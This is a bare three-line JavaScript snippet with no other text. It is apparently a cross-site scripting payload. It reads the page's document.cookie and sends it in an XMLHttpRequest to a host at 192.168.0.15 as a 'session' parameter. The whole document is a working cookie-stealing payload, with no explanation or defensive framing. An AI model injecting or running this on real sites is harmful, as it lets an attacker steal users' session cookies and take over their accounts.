var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.15/?session=' + document.cookie);
request.send();
